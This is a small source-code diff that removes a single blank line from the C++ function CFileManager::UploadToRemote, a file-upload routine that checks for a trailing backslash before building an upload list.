@@ -514,7 +514,6 @@ int CFileManager::SendToken(BYTE bToken)
 
 bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
 {
-
 	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
 	{
 		FixedUploadList((char *)lpBuffer);
